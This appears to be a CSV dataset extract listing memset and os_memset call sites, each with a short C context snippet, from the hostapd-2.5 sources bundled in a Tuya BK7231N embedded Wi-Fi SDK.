2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\drv_callbacks.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\drv_callbacks.c,"os_memset(&fi, 0, sizeof(fi));",120,1,"	}

	os_memset(&fi, 0, sizeof(fi));
	fi.datarate = rx_mgmt->datarate;
	fi.ssi_signal = rx_mgmt->ssi_signal;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,"os_memset(addr, 0xff, ETH_ALEN);",120,1,"	}
	wpa_dbg(hapd->msg_ctx, MSG_DEBUG, ""Deauthenticate all stations"");
	os_memset(addr, 0xff, ETH_ALEN);
	hostapd_drv_sta_deauth(hapd, addr, reason);
	hostapd_free_stas(hapd);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,"os_memset(mask, 0xff, ETH_ALEN);",120,1,"	}

	os_memset(mask, 0xff, ETH_ALEN);
	j = bits / 8;
	for (i = 5; i > 5 - j; i--)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,"os_memset(&das_conf, 0, sizeof(das_conf));",120,1,"	if (conf->radius_das_port) {
		struct radius_das_conf das_conf;
		os_memset(&das_conf, 0, sizeof(das_conf));
		das_conf.port = conf->radius_das_port;
		das_conf.shared_secret = conf->radius_das_shared_secret;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,"os_memset(beacon, 0, sizeof(*beacon));",120,1,"	int ret;

	os_memset(beacon, 0, sizeof(*beacon));
	ret = ieee802_11_build_ap_params(hapd, &params);
	if (ret < 0)
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,"os_memset(&old_freq, 0, sizeof(old_freq));",120,1,"	int ret;

	os_memset(&old_freq, 0, sizeof(old_freq));
	if (!iface || !iface->freq || hapd->csa_in_progress)
		return -1;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\hostapd.c,"os_memset(&hapd->cs_freq_params, 0, sizeof(hapd->cs_freq_params));",120,1,"void hostapd_cleanup_cs_params(struct hostapd_data *hapd)
{
	os_memset(&hapd->cs_freq_params, 0, sizeof(hapd->cs_freq_params));
	hapd->cs_count = 0;
	hapd->cs_block_tx = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11.c,"os_memset(&reply, 0, sizeof(reply));",120,1,"	struct ieee80211_mgmt reply;

	os_memset(&reply, 0, sizeof(reply));
	reply.frame_control =
		IEEE80211_FC(WLAN_FC_TYPE_MGMT, WLAN_FC_STYPE_DEAUTH);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11.c,"os_memset(buf, 0, sizeof(buf));",120,1,"	u8 *p;

	os_memset(buf, 0, sizeof(buf));
	reply = (struct ieee80211_mgmt *) buf;
	reply->frame_control =
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_ht.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_ht.c,"os_memset(cap, 0, sizeof(*cap));",120,1,"
	cap = (struct ieee80211_ht_capabilities *) pos;
	os_memset(cap, 0, sizeof(*cap));
	cap->ht_capabilities_info = host_to_le16(hapd->iconf->ht_capab);
	cap->a_mpdu_params = hapd->iface->current_mode->a_mpdu_params;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_ht.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_ht.c,"os_memset(scan_params, 0, sizeof(*scan_params));",120,1,"
		scan_params = (struct ieee80211_obss_scan_parameters *) pos;
		os_memset(scan_params, 0, sizeof(*scan_params));
		scan_params->width_trigger_scan_interval =
			host_to_le16(hapd->iconf->obss_interval);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_ht.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_ht.c,"os_memset(oper, 0, sizeof(*oper));",120,1,"
	oper = (struct ieee80211_ht_operation *) pos;
	os_memset(oper, 0, sizeof(*oper));

	oper->primary_chan = hapd->iconf->channel;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_shared.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_shared.c,"os_memset(&mgmt, 0, sizeof(mgmt));",120,1,"		    trans_id, WLAN_SA_QUERY_TR_ID_LEN);

	os_memset(&mgmt, 0, sizeof(mgmt));
	mgmt.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
					  WLAN_FC_STYPE_ACTION);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_shared.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\ieee802_11_shared.c,"os_memset(&resp, 0, sizeof(resp));",120,1,"		   MACSTR, MAC2STR(sa));

	os_memset(&resp, 0, sizeof(resp));
	resp.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
					  WLAN_FC_STYPE_ACTION);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(&sm->key_replay, 0, sizeof(sm->key_replay));",120,1,"
	if (sm->started) {
		os_memset(&sm->key_replay, 0, sizeof(sm->key_replay));
		sm->ReAuthenticationRequest = TRUE;
		return wpa_sm_step(sm);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(key192->key_mic, 0, mic_len);",120,1,"	key_info = WPA_GET_BE16(key->key_info);
	os_memcpy(mic, key192->key_mic, mic_len);
	os_memset(key192->key_mic, 0, mic_len);
	if (wpa_eapol_key_mic(PTK->kck, PTK->kck_len, akmp,
			      key_info & WPA_KEY_INFO_TYPE_MASK,
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(&sm->PTK, 0, sizeof(sm->PTK));",120,1,"{
	sm->PTK_valid = FALSE;
	os_memset(&sm->PTK, 0, sizeof(sm->PTK));
	wpa_auth_set_key(sm->wpa_auth, 0, WPA_ALG_NONE, sm->addr, 0, NULL, 0);
	sm->pairwise_set = FALSE;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(msk, 0, sizeof(msk));",120,1,"		return;
	}
	os_memset(msk, 0, sizeof(msk));

	sm->req_replay_counter_used = 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(igtk.pn, 0, sizeof(igtk.pn));",120,1,"	if (gsm->wpa_group_state != WPA_GROUP_SETKEYSDONE ||
	    wpa_auth_get_seqnum(sm->wpa_auth, NULL, gsm->GN_igtk, rsc) < 0)
		os_memset(igtk.pn, 0, sizeof(igtk.pn));
	else
		os_memcpy(igtk.pn, rsc, sizeof(igtk.pn));
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(rsc, 0, WPA_KEY_RSC_LEN);",120,1,"	   GTK[GN], IGTK, [FTIE], [TIE * 2])
	 */
	os_memset(rsc, 0, WPA_KEY_RSC_LEN);
	wpa_auth_get_seqnum(sm->wpa_auth, NULL, gsm->GN, rsc);
	/* If FT is used, wpa_auth->wpa_ie includes both RSNIE and MDIE */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth.c,"os_memset(group->GTK, 0, sizeof(group->GTK));",120,1,"
	/* GTK[0..N] = 0 */
	os_memset(group->GTK, 0, sizeof(group->GTK));
	group->GN = 1;
	group->GM = 2;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_glue.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_glue.c,"os_memset(wconf, 0, sizeof(*wconf));",120,1,"				  struct wpa_auth_config *wconf)
{
	os_memset(wconf, 0, sizeof(*wconf));
	wconf->wpa = conf->wpa;
	wconf->wpa_key_mgmt = conf->wpa_key_mgmt;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_glue.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_glue.c,"os_memset(&cb, 0, sizeof(cb));",120,1,"	if (hapd->iface->drv_flags & WPA_DRIVER_FLAGS_AP_MLME)
		_conf.ap_mlme = 1;
	os_memset(&cb, 0, sizeof(cb));
	cb.ctx = hapd;
	//cb.logger = hostapd_wpa_auth_logger;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_ie.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_ie.c,"os_memset(pos, 0x12, 17);",120,1,"		}

		os_memset(pos, 0x12, 17);
		pos += 17;
	}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_ie.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\ap\wpa_auth_ie.c,"os_memset(ie, 0, sizeof(*ie));",120,1,"	int ret = 0;

	os_memset(ie, 0, sizeof(*ie));
	for (pos = buf, end = pos + len; pos + 1 < end; pos += 2 + pos[1]) {
		if (pos[0] == 0xdd &&
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\hw_features_common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\hw_features_common.c,"os_memset(data, 0, sizeof(*data));",120,1,"			    int center_segment1, u32 vht_caps)
{
	os_memset(data, 0, sizeof(*data));
	data->mode = mode;
	data->freq = freq;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\ieee802_11_common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\ieee802_11_common.c,"os_memset(elems, 0, sizeof(*elems));",120,1,"	int unknown = 0;

	os_memset(elems, 0, sizeof(*elems));

	while (left >= 2) {
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\ieee802_11_common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\ieee802_11_common.c,"os_memset(info, 0, sizeof(*info));",120,1,"		       size_t ies_len)
{
	os_memset(info, 0, sizeof(*info));

	while (ies_buf && ies_len >= 2 &&
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\wpa_common.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\common\wpa_common.c,"os_memset(tmp, 0, sizeof(tmp));",120,1,"	wpa_hexdump_key(MSG_DEBUG, ""WPA: TK"", ptk->tk, ptk->tk_len);

	os_memset(tmp, 0, sizeof(tmp));
	return 0;
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\aes-internal-dec.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\aes-internal-dec.c,"os_memset(ctx, 0, AES_PRIV_SIZE);",120,1,"void aes_decrypt_deinit(void *ctx)
{
	os_memset(ctx, 0, AES_PRIV_SIZE);
	os_free(ctx);
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\aes-wrap.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\aes-wrap.c,"os_memset(a, 0xa6, 8);",120,1,"
	/* 1) Initialize variables. */
	os_memset(a, 0xa6, 8);
	os_memcpy(r, plain, 8 * n);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\bk_md5.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\bk_md5.c,"os_memset(k_pad, 0, sizeof(k_pad));",120,1,"
	/* start out by storing key in ipad */
	os_memset(k_pad, 0, sizeof(k_pad));
	os_memcpy(k_pad, key, key_len);

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\bk_md5.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\bk_md5.c,"os_memset(tk, 0, sizeof(tk));",120,1,"	res = md5_vector(2, _addr, _len, mac);
	os_memset(k_pad, 0, sizeof(k_pad));
	os_memset(tk, 0, sizeof(tk));
	return res;
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\crypto_ali.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\crypto_ali.c,"os_memset(context, 0, size);",120,1,"        return -1;
    }
    os_memset(context, 0, size);

    ali_hash_init(MD5, context);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,"os_memset(p, 0, count);",120,1,"    if (count < 8) {
	/* Two lots of padding:  Pad the first block to 64 bytes */
	os_memset(p, 0, count);
	byteReverse(ctx->in, 16);
	MD5Transform(ctx->buf, (u32 *) ctx->in);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,"os_memset(ctx->in, 0, 56);",120,1,"
	/* Now fill the next block with 56 bytes */
	os_memset(ctx->in, 0, 56);
    } else {
	/* Pad block to 56 bytes */
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,"os_memset(p, 0, count - 8);",120,1,"    } else {
	/* Pad block to 56 bytes */
	os_memset(p, 0, count - 8);
    }
    byteReverse(ctx->in, 14);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\md5-internal.c,"os_memset(ctx, 0, sizeof(*ctx));	*/",120,1,"    byteReverse((unsigned char *) ctx->buf, 4);
    os_memcpy(digest, ctx->buf, 16);
    os_memset(ctx, 0, sizeof(*ctx));	/* In case it's sensitive */
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,"os_memset(block, 0, 64);",120,1,"	a = b = c = d = e = 0;
#ifdef SHA1HANDSOFF
	os_memset(block, 0, 64);
#endif
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,"os_memset(context->buffer, 0, 64);",120,1,"	/* Wipe variables */
	i = 0;
	os_memset(context->buffer, 0, 64);
	os_memset(context->state, 0, 20);
	os_memset(context->count, 0, 8);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,"os_memset(context->state, 0, 20);",120,1,"	i = 0;
	os_memset(context->buffer, 0, 64);
	os_memset(context->state, 0, 20);
	os_memset(context->count, 0, 8);
	os_memset(finalcount, 0, 8);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,"os_memset(context->count, 0, 8);",120,1,"	os_memset(context->buffer, 0, 64);
	os_memset(context->state, 0, 20);
	os_memset(context->count, 0, 8);
	os_memset(finalcount, 0, 8);
}
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-internal.c,"os_memset(finalcount, 0, 8);",120,1,"	os_memset(context->state, 0, 20);
	os_memset(context->count, 0, 8);
	os_memset(finalcount, 0, 8);
}

"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-prf.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\crypto\sha1-prf.c,"os_memset(hash, 0, sizeof(hash));",120,1,"		counter++;
	}
	os_memset(hash, 0, sizeof(hash));

	return 0;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver.h,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver.h,"os_memset(&event, 0, sizeof(event));",120,1,"{
	union wpa_event_data event;
	os_memset(&event, 0, sizeof(event));
	event.assoc_info.reassoc = reassoc;
	event.assoc_info.req_ies = ie;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"memset(&iwr, 0, sizeof(iwr));",120,1,"    struct iwreq iwr;

    memset(&iwr, 0, sizeof(iwr));
    os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
    iwr.u.data.pointer = (c_addr_t) param;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"memset(param->sta_addr, 0xff, ETH_ALEN);",120,1,"    param->cmd = PRISM2_SET_ENCRYPTION;
    if (addr == NULL)
        memset(param->sta_addr, 0xff, ETH_ALEN);
    else
        memcpy(param->sta_addr, addr, ETH_ALEN);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"os_memset(param->sta_addr, 0xff, ETH_ALEN);",120,1,"    param->cmd = PRISM2_GET_ENCRYPTION;
    if (addr == NULL)
        os_memset(param->sta_addr, 0xff, ETH_ALEN);
    else
        os_memcpy(param->sta_addr, addr, ETH_ALEN);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"os_memset(&data, 0, sizeof(data));",120,1,"        {
            union wpa_event_data data;
            os_memset(&data, 0, sizeof(data));
            data.michael_mic_failure.unicast = 1;
            data.michael_mic_failure.src = addr;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"memset(&mgmt, 0, sizeof(mgmt));",120,1,"    }

    memset(&mgmt, 0, sizeof(mgmt));
    mgmt.frame_control = IEEE80211_FC(WLAN_FC_TYPE_MGMT,
                                      WLAN_FC_STYPE_DEAUTH);
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"os_memset(&iwr, 0, sizeof(iwr));",120,1,"    struct iwreq iwr;

    os_memset(&iwr, 0, sizeof(iwr));
    os_strlcpy(iwr.ifr_name, drv->iface, IFNAMSIZ);
    iwr.u.freq.m = freq->channel;
"
2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,Dataset Download,../../Dataset Download/2021\tuya-iotos-embeded-sdk-wifi-ble-bk7231n\platforms\bk7231n\bk7231n_os\beken378\func\hostapd-2.5\src\drivers\driver_beken.c,"os_memset(&hdr, 0, sizeof(hdr));",120,1,"    struct ieee80211_hdr hdr;

    os_memset(&hdr, 0, sizeof(hdr));

    /*
"
